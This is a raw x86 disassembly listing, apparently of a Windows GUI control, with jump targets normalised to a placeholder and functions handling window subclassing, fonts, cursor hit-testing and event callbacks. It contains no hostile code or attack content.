mov si 0xffb1
call sub_4038bc
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
xor eax eax
mov [ edi + 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x330 ]
xor edx edx
call sub_4374f0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x25c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x8 ]
lea edx [ ebx + 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_477b98
mov edx [ ebp - 0x4 ]
mov [ edx + 0x220 ] eax
jmp r-xdata
dec edx
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
lea edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_477b98
mov edx eax
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_4038bc
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x330 ]
cmp [ eax + 0x30 ] 0x0
jbe r-xdata
dec edx
je r-xdata
mov eax [ ebx + 0xc ]
sub eax 0x10001
je r-xdata
call sub_403f38
jmp r-xdata
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xdc ]
test al al
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
lea eax [ ebp - 0x90 ]
mov edx [ ebx + 0x1c ]
call sub_40461c
mov edx [ ebp - 0x90 ]
mov eax edi
call sub_475418
jmp r-xdata
test [ ebx + 0xc ] 0x1
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
mov edx edi
call sub_47664c
jmp r-xdata
mov eax edi
call sub_47632c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x245 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_448484
call sub_42960c
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x224 ] ebx
push 0xfffffffc
push ebx
call GetWindowLongA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x214 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
push eax
push 0xfffffffc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x224 ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
lea edx [ esi + 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_477b98
mov edx eax
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_4038bc
jmp r-xdata
mov ebx eax
xor edx edx
mov eax ebx
call sub_4374f0
lea edx [ esi + 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_477b98
mov [ ebx + 0xc ] eax
mov dl 0x1
mov eax ebx
call sub_4374f0
jmp r-xdata
sub edx 0x27
je r-xdata
test [ ebx + 0xc ] 0x10002
je r-xdata
dec eax
je r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xdc ]
test al al
jne r-xdata
xor eax eax
push ebp
push sub_477d89
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_422568
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_422408
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x170 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_422424
lea edx [ ebp - 0x26 ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xcc ]
mov [ ebp - 0x11 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor edx edx
call sub_422568
retn
mov cl 0x1
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xdc ]
test al al
je r-xdata
dec eax
je r-xdata
test [ ebx + 0xc ] 0x2
je r-xdata
mov eax [ edi + 0x8 ]
call sub_4048dc
mov edx eax
mov ecx [ ebx + 0x20 ]
dec ecx
mov eax [ ebx + 0x1c ]
call sub_409020
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x8 ]
lea edx [ ebx + 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_477b98
mov edi eax
mov eax [ ebx + 0xc ]
cmp eax 0x2
jne r-xdata
mov edx [ ebp - 0x8 ]
lea edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov si 0xffab
call sub_4038bc
jmp r-xdata
jmp r-xdata
xor edx edx
push ebp
push sub_478131
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebx + 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_422568
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_422408
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x170 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_422424
test [ ebx + 0x28 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x28c ]
test eax eax
je r-xdata
mov cl 0x1
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xdc ]
test al al
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x20
mov cl 0x2
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xdc ]
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_4223e0
retn
lea edx [ ebp - 0x26 ]
mov cl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xcc ]
jmp r-xdata
mov cl 0x2
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xdc ]
test al al
je r-xdata
dec eax
je r-xdata
test [ ebx + 0xc ] 0x20
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd4 ]
mov eax [ edi + 0x14 ]
mov [ ebx + 0x24 ] eax
cmp eax 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
mov si 0xffaa
call sub_4038bc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov edx [ eax + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edx + 0xc ] ecx
mov [ edx + 0x8 ] sub_478f70
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov [ eax + 0x8 ] sub_478f70
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
push 0x0
lea eax [ ebp - 0x12 ]
push eax
mov cx [ ebx + 0x28 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xd0 ]
mov [ ebp - 0x11 ] al
cmp [ ebp - 0x12 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov eax [ eax + 0xc ]
mov edx 0x8000000e
call sub_421514
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov eax [ eax + 0x14 ]
mov edx 0x8000000d
call sub_421ce0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
push eax
call DeleteObject
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x288 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x28c ] edx
push 0x1
lea eax [ ebp - 0x12 ]
push eax
mov cx [ ebx + 0x28 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
jmp r-xdata
mov cl 0x2
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xdc ]
test al al
je r-xdata
dec eax
je r-xdata
mov cl 0x3
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xdc ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x10
mov cl 0x1
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xdc ]
test al al
je r-xdata
lea edx [ ebp - 0x26 ]
mov cl 0x2
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xcc ]
jmp r-xdata
mov cl 0x3
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xdc ]
test al al
je r-xdata
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd8 ]
mov eax [ edi + 0x18 ]
mov [ ebx + 0x28 ] eax
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_4038bc
jmp r-xdata
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x10000
push 0x2
lea eax [ ebp - 0x12 ]
push eax
mov cx [ ebx + 0x28 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
jmp r-xdata
mov cl 0x3
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xdc ]
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x40
jmp r-xdata
lea edx [ ebp - 0x26 ]
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xcc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x210 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x4
jmp r-xdata
push 0x3
lea eax [ ebp - 0x12 ]
push eax
mov cx [ ebx + 0x28 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
mov cl 0x1
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xdc ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x20c ]
mov eax [ esi + 0xc ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] edx
mov eax [ esi + 0x14 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] edx
mov edi [ ebp - 0x8 ]
mov edi [ edi + 0x8 ]
mov eax [ esi + 0xc ]
mov eax [ eax + 0x18 ]
call sub_421054
mov [ edi + 0x30 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov eax [ eax + 0x14 ]
call sub_421cd8
call sub_421054
mov [ edi + 0x34 ] eax
lea eax [ ebp - 0x8a ]
push eax
push 0x3c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov eax [ eax + 0xc ]
call sub_421528
push eax
call GetObjectA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor edx edx
call sub_422568
retn
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor edx edx
call sub_422568
lea eax [ ebp - 0x8a ]
push eax
call CreateFontIndirectA
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x288 ] esi
push esi
mov eax [ ebx + 0x10 ]
push eax
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28c ] eax
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x2
sub_478618
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ esi ] 0xbc7b
jne r-xdata
mov edi [ esi ]
cmp edi 0x201
je r-xdata
mov edx esi
mov eax ebx
call sub_445f34
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx 0x7b
mov eax ebx
call sub_442f30
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax ebx
call sub_4424ec
test al al
jne r-xdata
cmp edi 0x203
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
cmp [ ebx + 0x9b ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_445ea0
test al al
jne r-xdata
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
sub_4786a6
add [ eax ] al
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_442560
mov esi [ ebx + 0x220 ]
xor eax eax
mov [ ebx + 0x238 ] eax
xor eax eax
mov [ ebx + 0x220 ] eax
test esi esi
jne r-xdata
test esi esi
je r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax ebx
call sub_4418a8
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_4778d0
mov esi eax
add esp 0x10
pop esi
pop ebx
retn
mov eax ebx
call sub_448484
mov edx [ esi + 0x10 ]
call sub_429638
test eax eax
je r-xdata
mov ebx [ ebx + 0x21c ]
mov edx eax
mov eax ebx
call sub_44ef04
push 0x2
mov ecx 0x2
xor edx edx
mov eax ebx
call sub_449da8
sub_478730
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_442580
xor eax eax
mov [ ebx + 0x238 ] eax
pop ebx
pop ebp
retn 0x4
sub_478750
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_447b88
mov edi [ esi + 0x8 ]
mov al [ esi + 0x4 ]
dec al
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x18 ]
mov eax ebx
call sub_477b2c
mov [ ebx + 0x238 ] eax
xor edx edx
mov eax ebx
call sub_477b64
mov eax [ edi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
jmp r-xdata
dec al
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx edi
mov eax ebx
call sub_4418a8
mov eax [ esp + 0x4 ]
push eax
cmp [ esi + 0xc ] 0x0
setne al
push eax
mov edx [ edi + 0x8 ]
mov ecx [ esp + 0x8 ]
mov eax ebx
call sub_4787d8
jmp r-xdata
dec al
je r-xdata
xor eax eax
mov [ ebx + 0x238 ] eax
jmp r-xdata
sub_4787d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4778d0
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_477b2c
cmp esi eax
jne r-xdata
xor eax eax
mov [ ebx + 0x238 ] eax
mov ebx edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x18 ]
mov dl 0x1
mov eax esi
call sub_475a88
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
cmp esi [ ebx + 0x238 ]
jne r-xdata
sub_478878
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x2ba ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_4788a4
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x285 ] 0x1
xor eax eax
call sub_4591b4
or al [ r-xdata ]
push eax
mov eax ebx
call sub_477ac0
mov edx eax
mov eax ebx
pop ecx
call sub_4791c0
cmp [ ebx + 0x2b2 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_478954
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x312 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x314 ]
call [ ebx + 0x310 ]
sub_4789a0
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x2ca ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_4789cc
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x2fa ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2fc ]
call [ ebx + 0x2f8 ]
sub_4789f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_478aa4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax ebx
call sub_477b98
mov [ ebp - 0x8 ] eax
mov edi [ esi + 0x10 ]
test edi edi
je r-xdata
cmp [ ebx + 0x2aa ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_40461c
mov edx esi
mov eax ebx
call sub_477b98
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x302 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478aab
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x2ac ]
call [ ebx + 0x2a8 ]
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x304 ]
call [ ebx + 0x300 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_475418
jmp r-xdata
sub_478ab4
push ebx
push ecx
mov ebx eax
mov eax [ r-xdata ]
mov [ esp ] eax
cmp [ ebx + 0x32a ] 0x0
je r-xdata
mov ecx [ ebx + 0x26c ]
mov dl 0x1
mov eax [ esp ]
call sub_475294
pop edx
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x32c ]
call [ ebx + 0x328 ]
sub_478b00
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_448788
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_448484
mov ecx edi
mov edx esi
call sub_4294e0
sub_478b28
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_448788
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi esi
mov eax edi
call sub_44ed6c
test al al
je r-xdata
xor eax eax
mov eax edi
call sub_44ef40
jmp r-xdata
cmp esi [ ebx + 0x260 ]
jne r-xdata
xor ecx ecx
mov edx eax
mov eax ebx
call sub_478b00
jmp r-xdata
cmp esi [ ebx + 0x234 ]
jne r-xdata
mov ecx 0x2
mov edx eax
mov eax ebx
call sub_478b00
sub_478b84
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_441234
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x234 ]
jne r-xdata
cmp esi [ edi + 0x260 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_478bc4
xor edx edx
mov eax edi
call sub_478c2c
sub_478bc4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x234 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x234 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x230 ]
call sub_44fc00
xor ecx ecx
xor edx edx
mov eax ebx
call sub_478b00
pop esi
pop ebx
retn
mov edx [ ebx + 0x230 ]
call sub_44fc44
mov edx ebx
mov eax [ ebx + 0x234 ]
call sub_41e274
mov eax [ ebx + 0x234 ]
call sub_44ef40
mov edx eax
xor ecx ecx
mov eax ebx
call sub_478b00
pop esi
pop ebx
retn
sub_478c2c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x260 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x260 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x264 ]
call sub_44fc00
mov ecx 0x2
xor edx edx
mov eax ebx
call sub_478b00
pop esi
pop ebx
retn
mov edx [ ebx + 0x264 ]
call sub_44fc44
mov edx ebx
mov eax [ ebx + 0x260 ]
call sub_41e274
mov eax [ ebx + 0x260 ]
call sub_44ef40
mov edx eax
mov ecx 0x2
mov eax ebx
call sub_478b00
pop esi
pop ebx
retn
sub_478c98
push ebx
push esi
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc0 ]
mov eax [ esi + 0x8 ]
call sub_414bc8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_44955c
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
call sub_45923c
mov ecx eax
mov dl 0x1
mov eax ebx
mov si 0xffd3
call sub_4038bc
add esp 0x20
pop esi
pop ebx
retn
mov eax ebx
call sub_477ac0
test eax eax
je r-xdata
mov eax ebx
call sub_477ac0
mov ecx esp
mov dl 0x1
call sub_476248
lea edx [ esp + 0x18 ]
mov eax esp
call sub_406990
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_44187c
lea eax [ esp + 0x10 ]
call sub_4074a8
mov [ esi + 0x8 ] eax
sub_478d28
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x220 ] edx
xor eax eax
push ebp
push sub_478e24
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_443404
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5d ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478e2b
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x220 ] edx
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9b ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc0 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
movsx ecx [ ebx + 0xa ]
movsx edx [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4778d0
mov ebx eax
test ebx ebx
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call GetCursorPos
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4418a8
lea eax [ ebp - 0x18 ]
call sub_4074a8
mov [ ebp - 0x10 ] eax
mov dx [ ebp - 0xe ]
mov ax [ ebp - 0x10 ]
call sub_40742c
push eax
xor ecx ecx
mov edx 0x202
mov eax [ ebp - 0x4 ]
call sub_442f30
jmp r-xdata
mov dl 0x1
mov eax ebx
call sub_475b10
mov dl 0x1
mov eax ebx
call sub_4759ac
or ecx 0xffffffff
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_442424
sub_478e30
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
cmp [ eax + 0x8 ] 0xfffffdee
jne r-xdata
mov edx esi
mov eax ebx
call sub_446834
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax ebx
call sub_4418a8
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
call sub_4778d0
mov edi eax
test edi edi
je r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0xb4 ] 0x1
je r-xdata
call sub_473b3c
cmp eax 0x40047
jl r-xdata
lea eax [ ebx + 0x270 ]
mov edx [ edi + 0x8 ]
call sub_404c68
mov edi 0x50
mov eax [ ebx + 0x270 ]
call sub_404c88
cmp edi eax
jg r-xdata
mov eax [ edi + 0x8 ]
call sub_4046e4
cmp eax 0x50
jge r-xdata
mov eax [ ebx + 0x270 ]
call sub_404c78
mov ebp [ esi + 0x8 ]
mov [ ebp + 0xc ] eax
lea eax [ ebp + 0x10 ]
xor ecx ecx
mov edx edi
call sub_402fc4
mov eax [ ebx + 0x270 ]
call sub_404c88
mov ecx eax
add ecx ecx
mov eax [ esi + 0x8 ]
lea edx [ eax + 0x10 ]
mov eax [ ebx + 0x270 ]
call sub_4028fc
mov eax [ esi + 0x8 ]
xor edx edx
mov [ eax + 0xb0 ] edx
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ eax ]
push eax
call SetWindowPos
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov edx edi
dec edx
lea eax [ ebx + 0x270 ]
call sub_404dc4
mov edx esi
mov eax ebx
call sub_446834
jmp r-xdata
sub_478f78
test cl cl
jne r-xdata
cmp dl 0x1
jne r-xdata
cmp dl 0x1
jne r-xdata
test dl dl
jne r-xdata
cmp [ eax + 0x2a2 ] 0x0
setne al
jmp r-xdata
test dl dl
jne r-xdata
cmp [ eax + 0x2e2 ] 0x0
jne r-xdata
xor eax eax
cmp [ eax + 0x29a ] 0x0
jne r-xdata
retn
xor eax eax
retn
cmp [ eax + 0x2da ] 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
cmp [ eax + 0x2a2 ] 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
cmp [ eax + 0x2a2 ] 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
cmp [ eax + 0x29a ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0x2e2 ] 0x0
jne r-xdata
cmp [ eax + 0x2a2 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
sub_47900c
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov edi edx
mov esi eax
mov [ esp ] 0x1
test bl bl
jne r-xdata
cmp [ esi + 0x29a ] 0x0
je r-xdata
cmp [ esi + 0x2da ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push ebx
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx esi
mov eax [ esi + 0x29c ]
call [ esi + 0x298 ]
push esp
mov ecx edi
mov edx esi
mov eax [ esi + 0x2dc ]
call [ esi + 0x2d8 ]
sub_479064
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x6 ] cx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x7 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x1
test bl bl
jne r-xdata
cmp [ esi + 0x2a2 ] 0x0
je r-xdata
cmp [ esi + 0x2e2 ] 0x0
je r-xdata
mov al [ ebp - 0x7 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov ax [ ebp - 0x6 ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x7 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ esi + 0x2a4 ]
call [ esi + 0x2a0 ]
mov ax [ ebp - 0x6 ]
push eax
lea eax [ ebp - 0x7 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ esi + 0x2e4 ]
call [ esi + 0x2e0 ]
sub_4790e0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ esi + 0x278 ]
mov edi [ eax + 0x8 ]
dec edi
cmp edi 0x1
jl r-xdata
test bl bl
jne r-xdata
mov edx edi
mov eax esi
call sub_479484
dec edi
test edi edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax esi
call sub_477b08
sub_479118
push ebx
push esi
mov esi edx
